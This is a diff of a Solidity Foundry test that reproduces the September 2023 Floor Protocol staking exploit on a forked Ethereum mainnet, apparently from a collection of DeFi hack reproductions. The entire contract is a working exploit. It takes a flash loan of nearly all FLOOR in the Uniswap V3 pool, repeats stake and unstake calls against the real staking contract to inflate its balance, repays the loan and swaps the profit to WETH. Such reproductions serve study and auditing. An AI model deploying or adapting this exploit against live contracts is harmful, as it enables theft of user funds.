@@ -14,7 +14,7 @@ import "./interface.sol";
 // https://publication.floor.xyz/floor-post-mortem-incident-summary-september-5-2023-e054a2d5afa4
 
 
-interface IFloodStaking {
+interface IFloorStaking {
     function unstake(
         address _to,
         uint256 _amount,
@@ -29,61 +29,65 @@ interface IFloodStaking {
     ) external returns (uint256);
 }
 
-interface IUniswapv3 {
-    function flash(
-        address recipient,
-        uint256 amount0,
-        uint256 amount1,
-        bytes calldata data
-    ) external;
-
-    function swap(
-        address recipient,
-        bool zeroForOne,
-        int256 amountSpecified,
-        uint160 sqrtPriceLimitX96,
-        bytes calldata data
-    ) external returns (int256 amount0, int256 amount1);
+interface IsFloor is IERC20{
+    function circulatingSupply() external returns(uint256);
 }
 
 
-contract FloodStakingExploit is Test {
-    IERC20 flood = IERC20(0xf59257E961883636290411c11ec5Ae622d19455e);
-    IERC20 gFlood = IERC20(0xb1Cc59Fc717b8D4783D41F952725177298B5619d);
+contract FloorStakingExploit is Test {
+    IERC20 floor = IERC20(0xf59257E961883636290411c11ec5Ae622d19455e);
+    IsFloor sFloor = IsFloor(0x164AFe96912099543BC2c48bb9358a095Db8e784);
+    IERC20 gFloor = IERC20(0xb1Cc59Fc717b8D4783D41F952725177298B5619d);
     IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
-
-    IFloodStaking staking = IFloodStaking(0x759c6De5bcA9ADE8A1a2719a31553c4B7DE02539);
-    IUniswapv3 floodUniPool = IUniswapv3(0xB386c1d831eED803F5e8F274A59C91c4C22EEAc0);
+    uint flashAmount;
+    IFloorStaking staking = IFloorStaking(0x759c6De5bcA9ADE8A1a2719a31553c4B7DE02539);
+    Uni_Pair_V3 floorUniPool = Uni_Pair_V3(0xB386c1d831eED803F5e8F274A59C91c4C22EEAc0);
 
 
     function setUp() public {
         vm.createSelectFork("https://eth.llamarpc.com", 18068772);
 
-        vm.label(address(flood), "FLOOD");
-        vm.label(address(gFlood), "gFlood");
+        vm.label(address(floor), "floor");
+        vm.label(address(sFloor), "sFloor");
+        vm.label(address(gFloor), "gFloor");
+        vm.label(address(WETH), "WETH");
+        vm.label(address(staking), "FloorStaking");
+        vm.label(address(floorUniPool), "Pool");
     }
 
-    function test_Flash() public {
-        flood.approve(address(staking), type(uint256).max);
-        IUniswapv3(0xB386c1d831eED803F5e8F274A59C91c4C22EEAc0).flash(address(this), 0, 152089813098498, '');
-      
-        console2.log("sell flood, balance", flood.balanceOf(address(this)));
-        //IUniswapv3(0xB386c1d831eED803F5e8F274A59C91c4C22EEAc0).swap(attacker, false,int256( 2000), 1461446485210103287273052203988822378723970341, '');
+    function testExploit() public {
+        flashAmount = floor.balanceOf(address(floorUniPool)) - 1;
+        floorUniPool.flash(address(this), 0, flashAmount, "");
+
+        uint256 profitAmount = floor.balanceOf(address(this));
+        emit log_named_decimal_uint("floor token balance after exploit", profitAmount, floor.decimals());
+        floorUniPool.swap(address(this), false, int256(profitAmount), uint160(0xfFfd8963EFd1fC6A506488495d951d5263988d25), "");
+        emit log_named_decimal_uint("weth balance after swap", WETH.balanceOf(address(this)), WETH.decimals());
     }
 
-    function uniswapV3FlashCallback(uint256 t0 , uint256 t1, bytes calldata) external {
-        while(true) {
-            uint256 base = flood.balanceOf(address(this));
-            staking.stake(address(this), base, false, true);
-            staking.unstake(address(this), gFlood.balanceOf(address(this)), true, false);
-            if( base >= 168129055504376) {
-                break;
+    function uniswapV3FlashCallback(uint256 /*fee0*/ , uint256 fee1, bytes calldata) external {
+        uint i = 0;
+        while(i < 17) {
+            uint balanceAttacker = floor.balanceOf(address(this));
+            uint balanceStaking = floor.balanceOf(address(staking));
+            uint circulatingSupply = sFloor.circulatingSupply();
+            if (balanceAttacker + balanceStaking > circulatingSupply) {
+                floor.approve(address(staking), balanceAttacker);
+                staking.stake(address(this), balanceAttacker, false, true);
+                uint gFloorBalance = gFloor.balanceOf(address(this));
+                staking.unstake(address(this), gFloorBalance, true, false);
+                i += 1;
             }
         }
 
-        flood.transfer(msg.sender, 153610711229483);
-        console2.log("flood balance after ", flood.balanceOf(address(this)));
-        console2.log("gflood balance after", gFlood.balanceOf(address(this)));
+        floor.transfer(msg.sender, flashAmount + fee1);
+    }
 
+    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
+        int256 amount = amount1Delta;
+        if (amount <= 0) {
+            amount = 0 - amount;
+        }
+        floor.transfer(msg.sender, uint256(amount));
     }
 }
